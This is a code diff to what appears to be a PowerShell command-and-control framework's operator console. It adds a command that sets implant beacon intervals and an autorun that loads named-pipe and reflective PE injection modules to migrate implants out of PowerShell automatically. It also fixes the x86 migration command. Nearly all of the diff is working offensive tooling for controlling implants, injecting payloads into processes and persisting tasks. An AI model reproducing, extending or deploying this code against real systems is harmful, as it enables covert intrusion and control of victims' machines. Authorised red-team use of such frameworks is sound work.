@@ -163,6 +163,34 @@ $header = '
                $HelpOutput = "PrintMainHelp"
                startup
             }
+            elseif ($global:implantid.ToLower().StartsWith("set-defaultbeacon")) 
+            {
+                [int]$Beacon = $global:implantid -replace "set-defaultbeacon ",""                                
+                $HelpOutput = "DefaultBeacon updated to: $Beacon" 
+                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE C2Server SET DefaultSleep='$Beacon'"|Out-Null
+                startup
+            }
+            elseif ($global:implantid -eq "automigrate-frompowershell")
+            {
+                $taskn = "LoadModule NamedPipe.ps1"
+                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
+                $taskm = "if ((`$p = Get-Process | ? {`$_.id -eq `$pid}).name -eq `"powershell`"){`$t=`$true};if (`$t -and [IntPtr]::size -eq 8){invoke-reflectivepeinjection -payload x64}elseif ((`$t -and [IntPtr]::size -eq 4)) {invoke-reflectivepeinjection -payload x86}"
+                $Query = 'INSERT
+                INTO AutoRuns (Task)
+                VALUES (@Task)'
+                
+                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
+                Task = $taskn
+                }
+                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
+                Task = $taskp
+                }
+                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
+                Task = $taskm
+                }
+                $HelpOutput = "Added automigrate-frompowershell"
+                startup      
+            }
             elseif ($global:implantid -eq "list-autorun") 
             {
                 $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
@@ -299,10 +327,12 @@ $header = '
         write-host " List-autorun"-ForegroundColor Green
         write-host " Del-autorun <taskID>"-ForegroundColor Green
         write-host " Nuke-autorun"-ForegroundColor Green
+        write-host " Automigrate-FromPowershell"-ForegroundColor Green
         write-host `n "Server Commands: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
-        write-host " Output-To-HTML"-ForegroundColor Green  
+        write-host " Output-To-HTML"-ForegroundColor Green
+        write-host " Set-DefaultBeacon 60"-ForegroundColor Green  
     }
 
     function print-help {
@@ -1248,7 +1278,7 @@ param
                 CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'migrate-x86',''
-                $pscommand = "invoke-reflectivepeinjection -payload x64 $($psargs)"
+                $pscommand = "invoke-reflectivepeinjection -payload x86 $($psargs)"
 
             }
             if ($pscommand.ToLower().StartsWith('migrate-x64'))
